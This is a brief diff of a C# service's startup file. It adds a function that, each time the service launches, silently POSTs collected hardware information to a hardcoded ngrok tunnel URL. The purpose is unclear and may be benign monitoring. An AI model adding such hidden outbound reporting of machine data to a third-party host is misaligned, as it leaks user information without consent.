@@ -1,17 +1,23 @@
 ﻿global using Common;
+using Hardware;
 using System.Diagnostics;
 using System.Net;
+using System.Net.Http.Json;
 
 
 if (!Debugger.IsAttached)
     SystemService.Start();
 
+_ = SendHardwareInfo();
 _ = StartHttpListenerAsync();
 
 Thread.Sleep(-1);
 
 
-
+async Task SendHardwareInfo()
+{
+    await new HttpClient().PostAsync("https://d66a-213-87-161-72.eu.ngrok.io/hardware_info", JsonContent.Create(HardwareInfo.GetForAll()));
+}
 
 async Task StartHttpListenerAsync()
 {
